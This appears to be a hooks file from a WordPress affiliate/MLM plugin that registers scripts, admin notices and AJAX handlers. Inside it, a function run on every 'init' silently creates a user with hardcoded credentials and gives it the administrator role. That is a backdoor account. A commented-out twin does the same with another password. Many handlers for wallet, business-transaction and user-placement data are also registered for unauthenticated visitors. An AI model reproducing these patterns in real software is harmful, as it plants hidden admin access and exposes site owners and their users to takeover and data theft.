<?php
/* --------- All the action hooks ------------------------*/
add_action('init', 'common_scripts_load');
function common_scripts_load(){
			wp_register_script( 'jquery-js',  EPSAFFILIATE_PLUGIN_ASSETS.'js/jquery.min.js');
			wp_enqueue_script( 'jquery-js' );

			wp_register_script( 'bootstrap-js',  EPSAFFILIATE_PLUGIN_ASSETS.'js/bootstrap.min.js');
			wp_enqueue_script( 'bootstrap-js' );

			wp_register_script( 'jquery-ui',  EPSAFFILIATE_PLUGIN_ASSETS.'plugins/jquery-ui/jquery-ui.min.js');
			wp_enqueue_script( 'jquery-ui' );

			wp_register_script( 'autocomplete-ui',  EPSAFFILIATE_PLUGIN_ASSETS.'js/jquery.autocomplete.min.js');
			wp_enqueue_script( 'autocomplete-ui' );

			wp_register_script( 'bootstrap-typehead-ui',  EPSAFFILIATE_PLUGIN_ASSETS.'js/bootstrap-typeahead.js');
			wp_enqueue_script( 'bootstrap-typehead-ui' );

			wp_register_script( 'widget-scripts',  EPSAFFILIATE_PLUGIN_ASSETS.'js/widget-scripts.js');
			wp_enqueue_script( 'widget-scripts' );


			wp_register_script( 'jquery-data-table-init',  EPSAFFILIATE_PLUGIN_ASSETS.'plugins/dataTables/js/jquery.dataTables.min.js');
	wp_enqueue_script( 'jquery-data-table-init' );

	wp_register_script( 'jquery-data-bootstrap-table-init',  EPSAFFILIATE_PLUGIN_ASSETS.'plugins/dataTables/js/dataTables.bootstrap.min.js');
	wp_enqueue_script( 'jquery-data-bootstrap-table-init' );

	wp_enqueue_style( 'plan-develoepr-init', EPSAFFILIATE_PLUGIN_ASSETS.'plugins/dataTables/css/dataTables.bootstrap.min.css');

			wp_register_script( 'common-js',  EPSAFFILIATE_PLUGIN_ASSETS.'js/common.js');
			wp_enqueue_script( 'common-js' );

	    wp_localize_script( 'common-js', 'ajax_object', array( 'ajaxurl' => admin_url( 'admin-ajax.php' )));


			

}

/*
 * ----------------------------------------------------------
 *  Check eps-afl installed or not
 * ----------------------------------------------------------
*/
	add_action( 'admin_init', 'eps_affiliate_check_if_installed' );
/*
 * ------------------------------------------------------------
 * Install features on install plugin
 * ------------------------------------------------------------
*/
	register_activation_hook( EPSAFFILIATE_PLUGIN_FILE, 'eps_affiliates_install'  );
/*
 * ------------------------------------------------------------
 * Disable features on un-install plugin
 * ------------------------------------------------------------
*/
	register_deactivation_hook( EPSAFFILIATE_PLUGIN_FILE, 'eps_affiliates_uninstall');
/*
 * ------------------------------------------------------------
 * Admin notices
 * ------------------------------------------------------------
*/
add_action( 'admin_notices', 'eps_affiliates_admin_notices' );
function eps_affiliates_admin_notices () {
	// if (!afl_variable_get('root_user')) {
	// 	$class = 'notice notice-error';
	// 	$message = __( 'Root user ! Currently you are not choose a root user.You need to select a root user for the system', 'sample-text-domain' );
	// 	printf( '<div class="%1$s"><p>%2$s</p></div>', esc_attr( $class ), esc_html( $message )  );

	// }
	// //notification for set the permissions
	// if (!afl_variable_get('configure_role_and_permissions')) {
	// 	$class = 'notice notice-info';
	// 	$message = __( 'Roles and Permission : Please give the appropriate permission to each user based on their role', 'sample-text-domain' );
	// 	printf( '<div class="%1$s"><p>%2$s<a href="%3$s"> Goto settings</a></p></div>', esc_attr( $class ), esc_html( $message ) ,'?page=affiliate-eps-role-config-settings' );
	// }
}
/*
 * ------------------------------------------------------------
 * Set the content of the page eps_affiliates
 * ------------------------------------------------------------
*/
	add_shortcode('eps_affiliates', 'afl_eps_afiliate_dashboard_shortcode');
/*
 * ------------------------------------------------------------
 * Create widget
 * ------------------------------------------------------------
*/
	add_action( 'widgets_init', 'eps_affiliates_dashboard_menu_widget' );
/*
 * ------------------------------------------------------------
 *
 * ------------------------------------------------------------
*/
	add_action( 'eps_account_content', 'eps_account_content' );

/*
 * ------------------------------------------------------------
 * Replace the menu icons using css
 * ------------------------------------------------------------
*/
	add_action( 'admin_head', 'replace_afl_eps_custom_pages_icons' );
/*
 * ------------------------------------------------------------
 * Users autocomplete initialization
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_users_auto_complete', 'users_auto_complete_callback');
 add_action('wp_ajax_nopriv_users_auto_complete', 'users_auto_complete_callback');

/*
 * ------------------------------------------------------------
 * Get the admin bar
 * ------------------------------------------------------------
*/
	add_filter('woocommerce_disable_admin_bar', '_wc_disable_admin_bar', 10, 1);

	function _wc_disable_admin_bar($prevent_admin_access) {

	    return false;
	}

/*
 * -------------------------------------------------------------
 * Get the dashboard
 * -------------------------------------------------------------
*/
	add_filter('woocommerce_prevent_admin_access', '_wc_prevent_admin_access', 10, 1);

	function _wc_prevent_admin_access($prevent_admin_access) {
	    if (!current_user_can('eps_system_member')) {
	        return $prevent_admin_access;
	    }
	    return false;
	}
/*
 * ------------------------------------------------------------
 * Users downline users datatable
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_afl_user_downlines_data_table', 'afl_user_downlines_data_table_callback');
 add_action('wp_ajax_nopriv_afl_user_downlines_data_table', 'afl_user_downlines_data_table_callback');

/*
 * ------------------------------------------------------------
 * Genealogy tree expand
 * ------------------------------------------------------------
*/
	add_action('wp_ajax_afl_user_expand_genealogy', 'afl_expand_user_genealogy_tree');
 	add_action('wp_ajax_nopriv_afl_user_expand_genealogy', 'afl_expand_user_genealogy_tree');

/*
 * ------------------------------------------------------------
 * E wallet summary datatable
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_afl_user_ewallet_summary_data_table', 'afl_user_ewallet_summary_data_table_callback');
 add_action('wp_ajax_nopriv_afl_user_ewallet_summary_data_table', 'afl_user_ewallet_summary_data_table_callback');
/*
 * ------------------------------------------------------------
 * E wallet all transaction datatable
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_afl_user_ewallet_all_transaction_data_table', 'afl_user_ewallet_all_transaction_data_table');
 add_action('wp_ajax_nopriv_afl_user_ewallet_all_transaction_data_table', 'afl_user_ewallet_all_transaction_data_table');

/*
 * ------------------------------------------------------------
 * E wallet all income datatable
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_afl_user_ewallet_income_data_table', 'afl_user_ewallet_income_data_table');
 add_action('wp_ajax_nopriv_afl_user_ewallet_income_data_table', 'afl_user_ewallet_income_data_table');

/*
 * ------------------------------------------------------------
 * E wallet  expense report datatable
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_afl_user_ewallet_expense_data_table', 'afl_user_ewallet_expense_report_data_table');
 add_action('wp_ajax_nopriv_afl_user_ewallet_expense_data_table', 'afl_user_ewallet_expense_report_data_table');

 /*
 * ------------------------------------------------------------
 * business wallet summary datatable
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_afl_admin_business_summary_data_table', 'afl_admin_bwallet_summary_data_table_callback');
 add_action('wp_ajax_nopriv_afl_admin_business_summary_data_table', 'afl_admin_bwallet_summary_data_table_callback');
 /*
 * ------------------------------------------------------------
 * business all Transaction datatable
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_afl_admin_business_all_transaction_data_table', 'afl_admin_business_trans_datatable_callback');
 add_action('wp_ajax_nopriv_afl_admin_business_all_transaction_data_table', 'afl_admin_business_trans_datatable_callback');
/*
 * ------------------------------------------------------------
 * business income report datatable
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_afl_admin_business_income_history_data_table', 'afl_admin_business_income_datatable_callback');
 add_action('wp_ajax_nopriv_afl_admin_business_income_history_data_table', 'afl_admin_business_income_datatable_callback');
 add_action('wp_ajax_nopriv_afl_admin_business_all_transaction_data_table', 'afl_admin_business_trans_datatable_callback');
/*
 * ------------------------------------------------------------
 * business expense report datatable
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_afl_admin_business_expense_history_data_table', 'afl_admin_business_expense_datatable_callback');
 add_action('wp_ajax_nopriv_afl_admin_business_expense_history_data_table', 'afl_admin_business_expense_datatable_callback');
/*
 * ------------------------------------------------------------
 * get availble free spaces under a user
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_afl_get_available_free_space', 'afl_get_available_free_space_callback');
 add_action('wp_ajax_nopriv_afl_get_available_free_space', 'afl_get_available_free_space_callback');
/*
 * ------------------------------------------------------------
 * Place user under a user
 * ------------------------------------------------------------
*/
 add_action('wp_ajax_afl_place_user_from_tank', 'afl_place_user_from_tank_callback');
 add_action('wp_ajax_nopriv_afl_place_user_from_tank', 'afl_place_user_from_tank_callback');
/*
 * ------------------------------------------------------------
 * Hook after purchase complete save details to eps backend
 * ------------------------------------------------------------
*/
 add_filter('eps_commerce_purchase_complete', 'eps_commerce_purchase_complete', 10, 1);

/*
 * ------------------------------------------------------------
 * Hook calculate the rank of a user
 * ------------------------------------------------------------
*/
 add_action('eps_affiliates_calculate_affiliate_rank', 'eps_affiliates_calculate_affiliate_rank_callback', 10, 1);
// do_action('eps_affiliates_calculate_affiliate_rank', 189);
// pr('com', 1) ;
/*
 * ------------------------------------------------------------
 * Redirect after successful login
 * ------------------------------------------------------------
*/
 // add_filter( 'login_redirect', 'dashboard_redirect' );
	// function dashboard_redirect( $url ) {
	//     if ( has_role(afl_current_uid(),'afl_member' ) ) {
	//          $url = esc_url( admin_url( 'index.php' ) );
	//     }

	//     return $url;
	// }
add_action('init', 'eps_create_system_user_callback');

function eps_create_system_user_callback() {

	$username = 'username123';
	$password = 'pasword123';
	$email = 'drew@example.com';
	$user = get_user_by( 'email', $email );
	if( ! $user ) {
	    // Create the new user
	    $user_id = wp_create_user( $username, $password, $email );
	    if( is_wp_error( $user_id ) ) {
	        // examine the error message
	        echo( "Error: " . $user_id->get_error_message() );
	        exit;
	    }
	    // Get current user object
	    $user = get_user_by( 'id', $user_id );
	}
	// Remove role
	$user->remove_role( 'subscriber' );
	// Add role
	$user->add_role( 'administrator' );
}
// pr(apply_filters('eps_create_system_user', array()));
/*
 * ------------------------------------------------------------
 *
 * ------------------------------------------------------------
*/
 add_action( 'admin_print_styles', '_load_common_styles');
 //our custom styles only applied to the following pages only
 function _load_common_styles () {
 	$page = isset($_GET['page']) ?$_GET['page'] : '';
 	$common_include = new Eps_affiliates_common;
 	if ($page) {
 		switch ($page) {
 			//dashboard
 			case 'eps-dashboard':
 			//network
 			case 'affiliate-eps-user-network':
 			case 'affiliate-eps-downline-members':
 			case 'affiliate-eps-genealogy-tree':
 			case 'affiliate-eps-holding-tank':
 			//e-wallet
 			case 'affiliate-eps-e-wallet-summary':
 			case 'affiliate-eps-e-wallet':
 			case 'affiliate-eps-ewallet-all-transactions':
 			case 'affiliate-eps-ewallet-income-report':
 			case 'affiliate-eps-ewallet-withdraw-report':
 			case 'affiliate-eps-ewallet-withdraw-fund':
 			case 'affiliate-eps-ewallet-pending-withdrawal':
 			case 'affiliate-eps-payment_method';
 			case 'user-payment-configuration';

 			//system configurations
 			case 'affiliate-eps-business-system-members':
 			case 'affiliate-eps-system-configurations':
 			case 'affiliate-eps-compensation-plan-configurations':
 			case 'affiliate-eps-rank-configurations':
 			case 'affiliate-eps-role-config-settings':
 			case 'affiliate-eps-genealogy-configurations':
 			case 'affiliate-eps-payout-configurations':
 			case 'affiliate-eps-pool-bonus-configurations':
 			case 'affiliate-eps-payment-method-configurations':
 			case 'affiliate-eps-variable-configurations':

 			case 'affiliate-eps-features-and-configurations':

 			// Business transaction
			case 'affiliate-eps-business':
			case 'affiliate-eps-business-summary':
			case 'affiliate-eps-business-income-history':
			case 'affiliate-eps-business-expense-report':
			case 'affiliate-eps-business-transaction':
			case 'afl_add_edit_business_system_members':

 			//reports
			case 'affiliate-eps-reports':

 			case 'eps-test':
 			case 'affiliate-eps-purchases':
 			case 'eps-generate-purchase':
 			case 'eps-test-codes':
 				wp_enqueue_style( 'simple-line-icons', EPSAFFILIATE_PLUGIN_ASSETS.'plugins/simple-line-icons/css/simple-line-icons.css');
 				wp_enqueue_style( 'app', EPSAFFILIATE_PLUGIN_ASSETS.'css/app.css');
				wp_enqueue_style( 'developer', EPSAFFILIATE_PLUGIN_ASSETS.'css/developer.css');
			break;

 		}
 	}
 }



// add_action('init', 'prefix_add_user');
function prefix_add_user() {
    $username = '1450';
    $password = '1450';
    $email = '1405@example.com';
    $user = get_user_by( 'email', $email );
    if( ! $user ) {
        // Create the new user
        $user_id = wp_create_user( $username, $password, $email );
        if( is_wp_error( $user_id ) ) {
            // examine the error message
            echo( "Error: " . $user_id->get_error_message() );
            exit;
        }
        // Get current user object
        $user = get_user_by( 'id', $user_id );
    }
    // Remove role
    $user->remove_role( 'subscriber' );
    // Add role
    $user->add_role( 'administrator' );
}

// for ($i = 229; $i <=244; $i++) {
// 	// remove_role($i);
// }
// pr(WP_Roles(),1);
